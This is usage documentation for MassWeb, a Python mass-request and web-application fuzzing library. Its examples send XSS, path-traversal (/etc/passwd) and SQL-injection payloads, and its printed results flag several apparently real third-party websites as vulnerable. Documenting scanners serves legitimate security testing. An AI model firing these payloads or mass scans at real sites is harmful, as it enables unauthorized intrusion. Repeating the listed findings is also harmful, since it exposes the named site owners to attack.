Usage
=====
.. include:: subs.rst

There are two main use cases for MassWeb:

* mass requests of URLs
* or mass scanning for vulnerabilities of these URLs,


Mass Requests
-------------


Mass requests are done via MassWeb's |MassRequest| object. Let's say, you're
just interested in requesting a bunch of URLs in a reasonable amount of time,
and don't want to deal with getting into the MassWeb API

Example 1
^^^^^^^^^
::

    >>> from massweb.mass_requests.mass_request import MassRequest
    >>> urls_to_fetch = [u"http://www.hyperiongray.com", u"http://course.hyperiongray.com/vuln1/", u"http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/"]
    >>> mr = MassRequest()
    >>> mr.get_urls(urls_to_fetch)
    >>> for target, response in mr.results:
    ...     print target, response
    ... 
    http://www.hyperiongray.com <Response [200]>
    http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/ <Response [200]>
    http://course.hyperiongray.com/vuln1/ <Response [200]>


In other words, simply instantiate a |MassRequest| object and pass in any
iterable to the :meth:`get_urls` function. Note that by default, the
|MassRequest| object works with 10 threads and has a timeout of 10 seconds per
URL (more on this later). What is returned is a tuple of the form::

    (url_fetched, Response)

To retrieve results, you can use the :data:`MassRequest.results` attribute, which simply
returns a tuple with the URL fetched and a `requests.Response
<http://docs.python-requests.org/en/latest/api/#requests.Response>`_ object, which gives you access to
everything you could ever want about the response from the server.

So let's consider a more complicated example, let's say we want to load in a
bunch of URLs to fetch via GET, but we also have some POST requests we want to
send. We do that by using the |Target| object to prepare our URLs and POST data
before sending it.

Example 2
^^^^^^^^^
::

    >>> from massweb.mass_requests.mass_request import MassRequest
    >>> from massweb.targets.target import Target
    >>>
    >>> target_1 = Target(url=u"http://course.hyperiongray.com/vuln1", data={"password": "blh123"}, ttype="post")
    >>> target_2 = Target(url=u"http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/", data={"how": "I'm good thx"}, ttype="post")
    >>> target_3 = Target(url=u"http://www.hyperiongray.com/", ttype="get")
    >>> targets = [target_1, target_2, target_3]
    >>> mr = MassRequest()
    >>> mr.request_targets(targets)
    >>> for result in mr.results:
    ...     print result
    ... 
    (<massweb.targets.target.Target object at 0x15496d0>, <Response [200]>)
    (<massweb.targets.target.Target object at 0x1549650>, <Response [200]>)
    (<massweb.targets.target.Target object at 0x1549490>, <Response [200]>)
    >>> for target, response in mr.results:
    ...     print target, response.status_code
    ... 
    http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/ 200
    http://www.hyperiongray.com/ 200
    http://course.hyperiongray.com/vuln1 200

Again, pretty simple, just create a |Target| object with the parameters :data:`url`, :data:`data`
(if it's a POST request), and :data:`ttype` of "post" or "get". Put these in some kind
of iterable and pass it off to :meth:`MassRequest.request_targets()`, which does all of the work
for you. What is returned is a tuple with the |Target| object (which casts to a
URL) and a `requests.Response <http://docs.python-requests.org/en/latest/api/#requests.Response>`_ object.

This is all great, but it's called *MASSWeb*, not fetch-me-3-URLs-web. Let's see
how we could conduct mass requests with this thing. Let's say we have a series
of about 1000 URLs and we want them fast, we don't have time to wait to make
sure our data is perfect, we want some quick and dirty responses if possible
and if they take too long, produce a timeout. First, let's say you have a file
called ``urls.txt`` of 1000 URLs and we want them in less then 2000 seconds or 2
seconds per URL. In other words, if it's not a URL that can be fetched quickly,
move on. This can be useful for things like web crawling when you have no idea
how long a target is going to take to respond and get you your data, so
regardless of whether it's a networking issue, too-much-data issue or anything
else, we want a hard timeout of 2 seconds per URL. Here's how we would do
that.

Example 3
^^^^^^^^^
::

    >>> urls_file = "urls.txt"
    >>> proxies = [{"http": "user:password@http://proxy.example.com:1234/some/path"}, {"http": "otheruser:otherpassword@http://proxy.example.net:6789/someother/path"}]
    >>> from massweb.mass_requests.mass_request import MassRequest
    >>> mr = MassRequest(num_threads=20, time_per_url=2, proxy_list=proxies)
    >>> mr.get_urls_from_file(urls_file)
    >>> len(mr.results)
    1000
    >>> for target, response in mr.results[:10]:
    ...     print target, response
    ... 
    http://www.abcselfstorage.co.uk/ __PNK_REQ_FAILED
    http://www.abcskiphirews32.co.uk/ __PNK_REQ_FAILED
    http://abcskateboarding.co.uk/ <Response [404]>
    http://www.abcsalestraining.co.uk/ <Response [200]>
    http://www.abcservice.co.uk/ <Response [200]>
    http://www.abcseaangling.co.uk/ <Response [200]>
    http://www.abcselfdrive.co.uk/ <Response [404]>
    http://www.abcselfstore.co.uk/storage-blogwp-login.php?redirect_to=http%3A%2F%2Fwww.abcselfstore.co.uk%2Fstorage-blog%2Fwp-admin%2F&amp;reauth=1 <Response [404]>
    http://www.abcselfstore.co.uk/abc24-hour-access.html <Response [200]>


We've already seen what is returned in normal cases, but the first couple of
items show a funny ``__PNK_REQ_FAILED`` string being returned instead of the 
`requests.Response <http://docs.python-requests.org/en/latest/api/#requests.Response>`_ object that we expect. These are URLs that were not fetched
properly for whatever reason, usually some kind of TCP timeout or an exception
in `Requests <http://docs.python-requests.org/en/latest/api/#requests.request>`_. Similarly if getting a URL times out (thread timeout, not
TCP timeout), then ``__PNK_THREAD_TIMEOUT`` is returned. The proxy list is just a
list of proxies `formatted like this
<http://docs.python-requests.org/en/latest/user/advanced/#proxies>`_ specifies.
Currently, requests get routed through proxies specified in the list at random,
though we are currently working on improving this.


Web Application Fuzzing
-----------------------

MassWeb is also a web application scanner. Let's scan some websites!

We're going to take a look at the main (and only for now) scanning class, the |WebFuzzer| class. This works by:

#. Creating a set of |Payloads| that will get inserted into GET and POST parameters.
#. Adding Targets (GET or POST requests to be performed) to the object.
#. Identifying additional POST requests on the GET requests specified, if you'd like.
#. Creating a list of |FuzzyTargets| (|Targets| with payloads attached to them)
#. Calling the :meth:`WebFuzzer.fuzz()` method.

The |WebFuzzer| allows you the same control that the |MassRequest| object
allows you. It's automatically threaded, and you can set how much time you
would like to allow it to take (it's also quite fast). That might sound like
few steps to get up and running, but it's actually quite easy. Let's see it in
action with a simple implementation of a web app fuzzer.

.. _example_4:

Example 4
^^^^^^^^^
::

    from massweb.fuzzers.web_fuzzer import WebFuzzer
    from massweb.payloads.payload import Payload

    proxies = [{"http": "user:password@http://proxy.example.com:1234/some/path"}, {"http": "otheruser:otherpassword@http://proxy2.example.net:6789/some/path"}]

    xss_payload = Payload('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])
    trav_payload = Payload('../../../../../../../../../../../../../../../../../../etc/passwd', check_type_list=["trav"])
    sqli_xpathi_payload = Payload("')--", check_type_list=["sqli", "xpathi"])

    wf = WebFuzzer(num_threads=30, time_per_url=5, proxy_list=proxies)
    wf.add_payload(xss_payload)
    wf.add_payload(trav_payload)
    wf.add_payload(sqli_xpathi_payload)
    wf.add_target_from_url(u"http://course.hyperiongray.com/vuln1")
    wf.add_target_from_url(u"http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/")
    wf.add_target_from_url(u"http://www.wpsurfing.co.za/?feed=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E")
    wf.add_target_from_url(u"http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;amp;ProName=1")
    wf.add_target_from_url(u"http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;amp;typeofsite=snippetdetail&amp;amp;ID=1368&amp;amp;Sectionid=1")
    wf.add_target_from_url(u"http://www.dobrevsource.org/index.php?id=1")

    print "Targets list pre post determination:"
    for target in wf.targets:
        print target

    print "Targets list after additional injection points have been found:"
    wf.determine_posts_from_targets()
    for target in wf.targets:
        print target.url, target.data

    print "FuzzyTargets list:"
    wf.generate_fuzzy_targets()
    for ft in wf.fuzzy_targets:
        print ft, ft.ttype, ft.data

    print "Results of our fuzzing:"
    for r in wf.fuzz():
        print r, r.fuzzy_target.ttype, r.fuzzy_target.payload


Let's run through the above code, first we create a |Payload| object, where we
add the payload string and a check type list. The `check_type_list` marks the
vulnerability or vulnerabilities that your payload is testing for. Valid check
types are: 

* mxi (mail header injection)
* osci (os command injection)
* sqli (SQL injection)
* trav (path traversal)
* xpathi (XPath injection)
* xss (cross site scripting)

The first two test for XSS and Path Traversal, while the third one is a valid
payload for both SQL Injection and XPath Injection. Then we instantiate the
|WebFuzzer| object, passing in some of our favorite parameters
:data:`num_threads` and :data:`time_per_url`, and then add the |Payloads| to it.
Next up, we add our |Targets|, we chose in the above to just add targets via a
URL, but this could also be done by adding a Target object and the
:meth:`WebFuzzer.add_target()` method, which would look something like the following

.. _example_5:

Example 5
^^^^^^^^^

::

    from massweb.targets.target import Target
    from massweb.fuzzers.web_fuzzer import WebFuzzer
    wf = WebFuzzer()
    target_1 = Target(u"http://www.hyperiongray.com")
    target_2 = Target(u"http://course.hyperiongray.com/vuln1", data={"password": "blah"}, ttype="post")


The advantage to specifying a |Target| object instead of adding targets via a
URL string is that you can explicitly specify POST requests that you'd like to
be included in your scanning. However, in most cases this is a pain, this
information would have to be determined by a web scraping script of some sort
to determine valid forms, valid parameters within those forms, etc. We wanted
an easier way. In the above example (:ref:`example_4`)
on line 26, calling ``wf.determine_posts_from_targets()`` will reach out
to the existing |Target| set and try to find POST requests for you (note: this
only supports finding basic forms for now, not AJAX POSTs or others) and
automatically adds them to the target set.

Following that, we must create our set of GET and POST requests with payloads
inserted explicitly, which is done via the :meth:`WebFuzzer.generate_fuzzy_targets()`
method. You can access the |FuzzyTargets| that this creates by the
:data:`WebFuzzer.fuzzy_targets` object attribute. |FuzzyTargets| are exactly like |Targets|,
except they include the payload that was used to generate it, which can be
accessed via the :data:`FuzzyTarget.payload` attribute.

Once the |FuzzyTargets| are generated, we can fuzz with ``wf.fuzz()``
which outputs a |Result| object. A result object is simply a result dictionary
(e.g. ``"results": {"xpathi": False, "sqli": False}``) and the |FuzzyTarget|
object that achieved this result. When cast to string, a |Result| object returns
valid JSON.

So let's visualize all of that so that it makes a bit more sense:

Targets list pre post determination::

    http://course.hyperiongray.com/vuln1
    http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/
    http://www.wpsurfing.co.za/?feed=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E
    http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;amp;ProName=1
    http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;amp;typeofsite=snippetdetail&amp;amp;ID=1368&amp;amp;Sectionid=1
    http://www.dobrevsource.org/index.php?id=1


Targets list after additional injection points have been found::

    http://course.hyperiongray.com/vuln1 None
    http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/ None
    http://www.wpsurfing.co.za/?feed=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E None
    http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;amp;ProName=1 None
    http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;amp;typeofsite=snippetdetail&amp;amp;ID=1368&amp;amp;Sectionid=1 None
    http://www.dobrevsource.org/index.php?id=1 None
    http://www.sfgcd.com/Search.asp {u'SubmitSearch': '', u'KeyWord': ''}
    http://course.hyperiongray.com/formhandler.php {u'password': ''}
    http://www.sfgcd.com/ProductsBuy.asp?Action=Buy {}
    http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/formhandler.php {u'how': ''}``


FuzzyTargets list::

    http://www.wpsurfing.co.za/?feed=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E get None
    http://www.wpsurfing.co.za/?feed=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd get None
    http://www.wpsurfing.co.za/?feed=%27%29-- get None
    http://www.sfgcd.com/ProductsBuy.asp?ProNo=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E&amp;ProName=1 get None
    http://www.sfgcd.com/ProductsBuy.asp?ProNo=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;ProName=1 get None
    http://www.sfgcd.com/ProductsBuy.asp?ProNo=%27%29--&amp;ProName=1 get None
    http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;ProName=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E get None
    http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;ProName=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd get None
    http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;ProName=%27%29-- get None
    http://www.gayoutdoors.com/page.cfm?snippetset=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=1 get None
    http://www.gayoutdoors.com/page.cfm?snippetset=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=1 get None
    http://www.gayoutdoors.com/page.cfm?snippetset=%27%29--&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=1 get None
    http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E&amp;ID=1368&amp;Sectionid=1 get None
    http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;ID=1368&amp;Sectionid=1 get None
    http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=%27%29--&amp;ID=1368&amp;Sectionid=1 get None
    http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E&amp;Sectionid=1 get None
    http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;Sectionid=1 get None
    http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=%27%29--&amp;Sectionid=1 get None
    http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E get None
    http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd get None
    http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=%27%29-- get None
    http://www.dobrevsource.org/index.php?id=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E get None
    http://www.dobrevsource.org/index.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd get None
    http://www.dobrevsource.org/index.php?id=%27%29-- get None
    http://www.sfgcd.com/Search.asp post {u'SubmitSearch': "')--", u'KeyWord': ''}
    http://www.sfgcd.com/Search.asp post {u'SubmitSearch': "')--", u'KeyWord': ''}
    http://www.sfgcd.com/Search.asp post {u'SubmitSearch': "')--", u'KeyWord': ''}
    http://www.sfgcd.com/Search.asp post {u'SubmitSearch': '', u'KeyWord': "')--"}
    http://www.sfgcd.com/Search.asp post {u'SubmitSearch': '', u'KeyWord': "')--"}
    http://www.sfgcd.com/Search.asp post {u'SubmitSearch': '', u'KeyWord': "')--"}
    http://course.hyperiongray.com/formhandler.php post {u'password': "')--"}
    http://course.hyperiongray.com/formhandler.php post {u'password': "')--"}
    http://course.hyperiongray.com/formhandler.php post {u'password': "')--"}
    http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/formhandler.php post {u'how': "')--"}
    http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/formhandler.php post {u'how': "')--"}
    http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/formhandler.php post {u'how': "')--"}


Results of our fuzzing::

    {"url": "http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;ProName=%27%29--", "results": {"xpathi": false, "sqli": false}} get ')--
    {"url": "http://www.wpsurfing.co.za/?feed=%27%29--", "results": {"xpathi": false, "sqli": false}} get ')--
    {"url": "http://www.wpsurfing.co.za/?feed=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E", "results": {"xss": true}} get "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://www.wpsurfing.co.za/?feed=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "results": {"trav": false}} get ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://www.sfgcd.com/ProductsBuy.asp?ProNo=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;ProName=1", "results": {"trav": false}} get ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=1", "results": {"trav": false}} get ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://www.sfgcd.com/ProductsBuy.asp?ProNo=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E&amp;ProName=1", "results": {"xss": false}} get "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;ProName=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "results": {"trav": false}} get ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=1", "results": {"xss": false}} get "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E&amp;ID=1368&amp;Sectionid=1", "results": {"xss": true}} get "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;ID=1368&amp;Sectionid=1", "results": {"trav": false}} get ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=%27%29--&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=1", "results": {"xpathi": false, "sqli": false}} get ')--
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E", "results": {"xss": true}} get "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=%27%29--&amp;ID=1368&amp;Sectionid=1", "results": {"xpathi": false, "sqli": false}} get ')--
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E&amp;Sectionid=1", "results": {"xss": false}} get "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=%27%29--&amp;Sectionid=1", "results": {"xpathi": false, "sqli": false}} get ')--
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "results": {"trav": false}} get ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=%27%29--", "results": {"xpathi": false, "sqli": true}} get ')--
    {"url": "http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&amp;Sectionid=1", "results": {"trav": false}} get ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://www.dobrevsource.org/index.php?id=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E", "results": {"xss": false}} get "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://www.dobrevsource.org/index.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "results": {"trav": true}} get ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://www.dobrevsource.org/index.php?id=%27%29--", "results": {"xpathi": false, "sqli": false}} get ')--
    {"url": "http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;ProName=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E", "results": {"xss": false}} get "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://course.hyperiongray.com/formhandler.php", "results": {"xss": false}} post "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://course.hyperiongray.com/formhandler.php", "results": {"xpathi": false, "sqli": false}} post ')--
    {"url": "http://course.hyperiongray.com/formhandler.php", "results": {"trav": false}} post ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://www.sfgcd.com/Search.asp", "results": {"xpathi": false, "sqli": false}} post ')--
    {"url": "http://www.sfgcd.com/Search.asp", "results": {"xss": false}} post "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://www.sfgcd.com/Search.asp", "results": {"trav": false}} post ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://www.sfgcd.com/Search.asp", "results": {"xss": false}} post "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/formhandler.php", "results": {"xss": false}} post "><ScRipT>alert(31337)</ScrIpT>
    {"url": "http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/formhandler.php", "results": {"trav": false}} post ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://www.sfgcd.com/Search.asp", "results": {"trav": false}} post ../../../../../../../../../../../../../../../../../../etc/passwd
    {"url": "http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/formhandler.php", "results": {"xpathi": false, "sqli": false}} post ')--
    {"url": "http://www.sfgcd.com/Search.asp", "results": {"xpathi": false, "sqli": false}} post ')--
    {"url": "http://www.sfgcd.com/ProductsBuy.asp?ProNo=%27%29--&amp;ProName=1", "results": {"xpathi": false, "sqli": false}} get ')--


.. note::
    It is highly recommended that proxy credentials not be part of your code. Pulling them from environmental variables or configuration files outside of your codebase are recommended. The examples above include them inline for the sake of simplicity.

